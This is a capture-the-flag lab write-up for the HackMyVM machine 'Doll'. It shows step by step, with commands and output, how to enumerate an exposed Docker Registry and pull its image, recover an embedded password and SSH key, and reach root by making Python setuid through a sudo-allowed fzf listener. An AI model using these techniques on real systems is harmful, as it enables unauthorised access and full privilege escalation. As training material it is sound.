# Doll

## Executive Summary
| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Doll | sml | Beginner | HackMyVM |

**Summary:** Doll is a beginner-level Linux machine demonstrating vulnerabilities in Docker Registry security and sudo misconfiguration. Initial access is achieved by discovering an exposed Docker Registry service that contains a Docker image with embedded credentials—including a hardcoded password and an encrypted SSH private key. After extracting and analyzing the image, SSH authentication succeeds using the discovered credentials. Privilege escalation exploits a sudo misconfiguration allowing execution of the fzf utility as root, which is leveraged to set the SUID bit on Python3 and spawn a root shell.

---

## Reconnaissance

### Network Discovery

The initial reconnaissance phase began with network scanning to identify active hosts within the target subnet. Using a PowerShell-based network scanner, the target machine was identified at IP address **192.168.100.84** with a VirtualBox MAC address.

```powershell
PowerShell 7.5.4
PS C:\Windows\System32> cd D:\CTF_Tools\
PS D:\CTF_Tools> .\ScanNetwork-CTF.ps1
[*] Your IP  : 192.168.100.1
[*] Scanning : 192.168.100.0/24
[*] Status   : Pinging hosts...

[+] Virtual Targets Found:
------------------------------------------------------------

IP             MAC               Vendor
--             ---               ------
192.168.100.84 08:00:27:55:49:F0 VirtualBox
```

### Port Scanning and Service Enumeration

A comprehensive Nmap scan was conducted to identify open ports and running services on the target system. The scan revealed two open TCP ports:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll]
└─$ nmap -sV -sC -p- -T4 192.168.100.84
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-05 14:48 WIB
Nmap scan report for 192.168.100.84
Host is up (0.0024s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 d7:32:ac:40:4b:a8:41:66:d3:d8:11:49:6c:ed:ed:4b (RSA)
|   256 81:0e:67:f8:c3:d2:50:1e:4d:09:2a:58:11:c8:d4:95 (ECDSA)
|_  256 0d:c3:7c:54:0b:9d:31:32:f2:d9:09:d3:ed:ed:93:cd (ED25519)
1007/tcp open  http    Docker Registry (API: 2.0)
|_http-title: Site doesn't have a title.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.62 seconds
```

**Key Findings:**
- **Port 22/TCP**: OpenSSH 8.4p1 Debian 5+deb11u1 - Standard SSH service
- **Port 1007/TCP**: Docker Registry (API: 2.0) - Unusual port for Docker Registry, potential attack vector

The presence of an exposed Docker Registry on a non-standard port immediately becomes the primary focus for further investigation.

---

## Docker Registry Enumeration

### API Interaction

Docker Registry exposes a REST API that can be queried to enumerate available images and tags. The first step was to verify connectivity to the registry's API endpoint:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll]
└─$ curl http://192.168.100.84:1007/v2/
{}
```

The empty JSON response `{}` confirms that the Docker Registry API v2 is accessible and responding correctly.

### Repository Discovery

Next, the `_catalog` endpoint was queried to list all available repositories within the registry:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll]
└─$ curl http://192.168.100.84:1007/v2/_catalog
{"repositories":["dolly"]}
```

The registry contains a single repository named **"dolly"**, which is highly suspicious and worth investigating further.

### Tag Enumeration

To identify available versions or tags of the "dolly" image, the tags endpoint was queried:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll]
└─$ curl http://192.168.100.84:1007/v2/dolly/tags/list
{"name":"dolly","tags":["latest"]}
```

The repository has one tag: **"latest"**. This confirms we have found a complete Docker image that can be extracted for analysis.

---

## Docker Image Extraction and Analysis

### Downloading the Image

Using the `skopeo` utility, the Docker image was copied from the remote registry to the local filesystem for offline analysis. The `--src-tls-verify=false` flag was used to bypass SSL certificate verification:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll]
└─$ skopeo copy --src-tls-verify=false docker://192.168.100.84:1007/dolly:latest dir:/tmp/doll/dolly_extracted
Getting image source signatures
Copying blob 5f8746267271 done   |
Copying blob f56be85fc22e done   |
Copying config 119a9c7e66 done   |
Writing manifest to image destination
```

The extraction process downloaded three primary components:
1. Two blob layers (compressed filesystem layers)
2. One configuration file (JSON metadata)
3. Manifest and version files

### Examining Extracted Files

The extracted files were analyzed to understand their structure:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll]
└─$ cd dolly_extracted

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/dolly_extracted]
└─$ ls -la
total 3320
drwxr-xr-x 2 ouba ouba    4096 Feb  5 15:16 .
drwxr-xr-x 3 ouba ouba    4096 Feb  5 15:16 ..
-rw-r--r-- 1 ouba ouba    1580 Feb  5 15:16 119a9c7e66da1a1f73ca186f5702ecdf1ca1b27102a3b46a8a17672ac320b309
-rw-r--r-- 1 ouba ouba    3707 Feb  5 15:16 5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017
-rw-r--r-- 1 ouba ouba 3374563 Feb  5 15:16 f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09
-rw-r--r-- 1 ouba ouba     736 Feb  5 15:16 manifest.json
-rw-r--r-- 1 ouba ouba      33 Feb  5 15:16 version

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/dolly_extracted]
└─$ file ./*
./5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017: gzip compressed data, original size modulo 2^32 19456
./119a9c7e66da1a1f73ca186f5702ecdf1ca1b27102a3b46a8a17672ac320b309: JSON text data
./f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09: gzip compressed data, original size modulo 2^32 7337984
./manifest.json:                                                    JSON text data
./version:                                                          ASCII text
```

**File Analysis:**
- **119a9c7e66...**: JSON configuration file containing image metadata and build history
- **5f8746267271...**: Gzipped filesystem layer (19,456 bytes uncompressed)
- **f56be85fc22e...**: Gzipped filesystem layer (7,337,984 bytes uncompressed)
- **manifest.json**: Image manifest describing the structure
- **version**: Version information

### Analyzing Image Metadata

The JSON configuration file was examined for sensitive information or build artifacts:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/dolly_extracted]
└─$ cat 119a9c7e66da1a1f73ca186f5702ecdf1ca1b27102a3b46a8a17672ac320b309 | jq
...
    {
      "created": "2023-03-29T18:19:24.45578926Z",
      "created_by": "ARG passwd=dev[REDACTED]",
      "comment": "buildkit.dockerfile.v0",
      "empty_layer": true
    },
...
```

**Critical Discovery:** The image build history reveals a Dockerfile ARG directive containing a hardcoded password: `passwd=dev[REDACTED]`. This password appears to be a development credential that was inadvertently left in the image metadata. While its exact purpose is unclear at this stage, it's saved for potential future use as a passphrase or authentication credential.

### Extracting Filesystem Layers

Both gzipped blob layers were extracted using tar to inspect their filesystem contents:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/dolly_extracted]
└─$ mkdir /tmp/doll/f56

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/dolly_extracted]
└─$ tar -xf f56be85fc22e46face30e2c3de3f7fe7c15f8fd7c4e5add29d7f64b87abdaa09 -C /tmp/doll/f56

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/dolly_extracted]
└─$ mkdir /tmp/doll/5f8

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/dolly_extracted]
└─$ tar -xf 5f8746267271592fd43ed8a2c03cee11a14f28793f79c0fc4ef8066dac02e017  -C /tmp/doll/5f8
```

The **f56** layer was found to contain mostly base operating system files with no particularly interesting content in the root or user directories.

The **5f8** layer, however, contained critical information:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/5f8]
└─$ ls -lah ./*
./etc:
total 32K
drwxr-xr-x 2 ouba ouba 4.0K Apr 25  2023 .
drwxr-xr-x 5 ouba ouba 4.0K Feb  5 15:19 ..
-rw-r--r-- 1 ouba ouba  710 Apr 25  2023 group
-rw-r--r-- 1 ouba ouba  697 Nov  4  2022 group-
-rw-r--r-- 1 ouba ouba 1.2K Apr 25  2023 passwd
-rw-r--r-- 1 ouba ouba 1.2K Apr 25  2023 passwd-
-rw-r----- 1 ouba ouba  553 Apr 25  2023 shadow
-rw-r----- 1 ouba ouba  448 Apr 25  2023 shadow-

./home:
total 12K
drwxr-xr-x 3 ouba ouba 4.0K Apr 25  2023 .
drwxr-xr-x 5 ouba ouba 4.0K Feb  5 15:19 ..
drwxr-xr-x 3 ouba ouba 4.0K Apr 25  2023 bela

./root:
total 12K
drwx------ 2 ouba ouba 4.0K Apr 25  2023 .
drwxr-xr-x 5 ouba ouba 4.0K Feb  5 15:19 ..
-rw------- 1 ouba ouba   49 Apr 25  2023 .ash_history
```

**Key Findings:**
- System user configuration files (`/etc/passwd`, `/etc/shadow`, `/etc/group`)
- A home directory for user **"bela"**
- Root user's shell history file (`.ash_history` suggests Alpine Linux base)

### Discovering SSH Credentials

Exploring the **bela** user's home directory revealed SSH authentication materials:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/5f8]
└─$ cd ./home/bela

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/5f8/home/bela]
└─$ ls -lah
total 16K
drwxr-xr-x 3 ouba ouba 4.0K Apr 25  2023 .
drwxr-xr-x 3 ouba ouba 4.0K Apr 25  2023 ..
-rw------- 1 ouba ouba   57 Apr 25  2023 .ash_history
drwxr-xr-x 2 ouba ouba 4.0K Apr 25  2023 .ssh
-rwxr-xr-x 1 ouba ouba    0 Jan  1  1970 .wh..wh..opq

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/doll/5f8/home/bela]
└─$ cd .ssh

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/5f8/home/bela/.ssh]
└─$ ls -lah
total 12K
drwxr-xr-x 2 ouba ouba 4.0K Apr 25  2023 .
drwxr-xr-x 3 ouba ouba 4.0K Apr 25  2023 ..
-rw-r--r-- 1 ouba ouba 2.6K Apr 25  2023 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/5f8/home/bela/.ssh]
└─$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDcKqC+Vu
..............................[REDACTED]..............................
s36mc0/mgAn/DqV6IUu+puFI3cRm8D1234DKkmWetOhGyu5TCnCUH83VYCwaKXpYddPXL0
VtVwCw==
-----END OPENSSH PRIVATE KEY-----
```

**Critical Discovery:** An encrypted OpenSSH private key (`id_rsa`) was found in bela's `.ssh` directory. The key is protected with AES-256-CTR encryption using bcrypt for key derivation, meaning a passphrase is required to use it.

---

## Initial Access

### SSH Key Decryption

To verify that the private key is indeed encrypted and to attempt decryption, the `ssh-keygen` utility was used. First, appropriate permissions were set on the key file:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/5f8/home/bela/.ssh]
└─$ chmod 600 id_rsa

┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/5f8/home/bela/.ssh]
└─$ ssh-keygen -y -f id_rsa
Enter passphrase for "id_rsa":
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCyBSUdK8GS[REDACTED]+LeNTRwL4Z1Zgz9dMplY0FqvZs= bela@doll
```

When prompted for the passphrase, the previously discovered password (`dev[REDACTED]`) from the Docker image metadata was used. **The key was successfully decrypted**, confirming that the password found in the Dockerfile ARG was indeed the passphrase for bela's SSH private key. This demonstrates a severe security misconfiguration where sensitive credentials are embedded in container images.

### SSH Authentication

With the decrypted private key, SSH authentication was attempted as user **bela**:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[/tmp/…/5f8/home/bela/.ssh]
└─$ ssh -i id_rsa bela@192.168.100.84
...
Enter passphrase for key 'id_rsa':
Linux doll 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64
...
bela@doll:~$ id
uid=1000(bela) gid=1000(bela) grupos=1000(bela),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
bela@doll:~$ ls -la
total 36
drwxr-xr-x 4 bela bela 4096 abr 25  2023 .
drwxr-xr-x 3 root root 4096 abr 25  2023 ..
lrwxrwxrwx 1 bela bela    9 abr 25  2023 .bash_history -> /dev/null
-rw-r--r-- 1 bela bela  220 abr 25  2023 .bash_logout
-rw-r--r-- 1 bela bela 3526 abr 25  2023 .bashrc
drwxr-xr-x 3 bela bela 4096 abr 25  2023 .local
-rw-r--r-- 1 bela bela  807 abr 25  2023 .profile
drwx------ 2 bela bela 4096 abr 25  2023 .ssh
-rw------- 1 bela bela   19 abr 25  2023 user.txt
-rw------- 1 bela bela   50 abr 25  2023 .Xauthority
```

**Success!** SSH authentication was successful and we now have an interactive shell as user **bela**. The system is running Debian Linux with kernel version 5.10.0-21-amd64. The user flag is visible as **user.txt** in bela's home directory.

**Security Note:** The `.bash_history` file is symlinked to `/dev/null`, which is a common anti-forensics technique to prevent command history logging.

---

## Privilege Escalation

### Sudo Enumeration

The first step in privilege escalation enumeration is to check what commands the current user can execute with sudo privileges:

```bash
bela@doll:~$ sudo -l
Matching Defaults entries for bela on doll:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bela may run the following commands on doll:
    (ALL) NOPASSWD: /usr/bin/fzf --listen\=1337
```

**Critical Finding:** User **bela** can execute `/usr/bin/fzf --listen=1337` as root without a password. The `fzf` (fuzzy finder) utility is a command-line fuzzy finder tool, and the `--listen` flag enables a network listener that accepts commands via HTTP.

### Researching fzf Exploitation

Consulting GTFOBins (a curated list of Unix binaries that can be exploited for privilege escalation), the entry for `fzf` was found:

![fzf gtfo](image.png)

The GTFOBins entry confirms that `fzf` with the `--listen` parameter can be exploited for privilege escalation. The vulnerability lies in the `execute` functionality that allows arbitrary command execution through HTTP POST requests to the listening service.

### Exploitation Strategy

The exploitation requires two concurrent terminal sessions:

**Terminal 1 - Starting the fzf listener:**

```bash
bela@doll:~$ sudo /usr/bin/fzf --listen=1337
```

This command starts `fzf` as root with a network listener on port 1337. The terminal window displays the fzf interface and must remain open for the exploit to work.

**Terminal 2 - Sending malicious commands:**

First, verify that Python3 is available on the system and identify its actual binary path:

```bash
bela@doll:~$ which python3
/usr/bin/python3
bela@doll:~$ ls -la /usr/bin/python3
lrwxrwxrwx 1 root root 9 abr  5  2021 /usr/bin/python3 -> python3.9
```

Python3 is present and is a symlink to `python3.9`. Now, send a malicious command to the fzf listener to set the SUID bit on the Python3.9 binary:

```bash
bela@doll:~$ curl http://localhost:1337 -d 'execute(chmod +s /usr/bin/python3.9)'
bela@doll:~$
```

This command sends a POST request to the fzf listener with the `execute()` function containing `chmod +s /usr/bin/python3.9`. Because fzf is running as root, this command executes with root privileges, setting both the SUID and SGID bits on the Python3.9 binary.

### Verifying SUID Modification

Confirm that the SUID bit was successfully set on the Python binary:

```bash
bela@doll:~$ ls -la /usr/bin/python3
lrwxrwxrwx 1 root root 9 abr  5  2021 /usr/bin/python3 -> python3.9
bela@doll:~$ ls -la /usr/bin/python3.9
-rwsr-sr-x 1 root root 5479736 feb 28  2021 /usr/bin/python3.9
```

**Success!** The permissions have changed from `-rwxr-xr-x` to `-rwsr-sr-x`. The `s` in the owner and group execute positions indicates that the SUID and SGID bits are now set. Any user executing this binary will run it with root's effective user ID.

### Spawning Root Shell

With Python3.9 now having the SUID bit set, a root shell can be spawned using Python's `os` module:

```bash
bela@doll:~$ python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/bash")'
root@doll:~# id ; whoami; hostname
uid=0(root) gid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),1000(bela)
root
doll
root@doll:~# cat /home/bela/user.txt /root/root.txt
[REDACTED]MV
[REDACTED]MV
```

**Root Access Achieved!** The Python one-liner uses `os.setuid(0)` and `os.setgid(0)` to set the effective user and group IDs to 0 (root), then spawns a bash shell. The system is now fully compromised with root privileges, and both user and root flags have been captured.

---

## Attack Chain Summary

1. **Reconnaissance**: Performed network scanning to identify target at 192.168.100.84, followed by comprehensive Nmap port scan revealing SSH (22/tcp) and Docker Registry (1007/tcp) services.

2. **Vulnerability Discovery**: Enumerated Docker Registry API to discover the "dolly" repository, extracted the Docker image using skopeo, and analyzed filesystem layers. Found hardcoded password `dev[REDACTED]` in image build metadata and encrypted SSH private key for user "bela" in extracted filesystem.

3. **Exploitation**: Decrypted the SSH private key using the password found in Docker metadata, successfully authenticated to the target system as user "bela" via SSH, and captured the user flag.

4. **Internal Enumeration**: Executed `sudo -l` to identify privilege escalation vectors, discovering that user bela can execute `/usr/bin/fzf --listen=1337` as root without password authentication.

5. **Privilege Escalation**: Started fzf listener as root via sudo, exploited fzf's execute function by sending HTTP POST request to set SUID bit on `/usr/bin/python3.9`, and leveraged SUID Python to spawn root shell using `os.setuid(0)` and captured the root flag, achieving full system compromise.

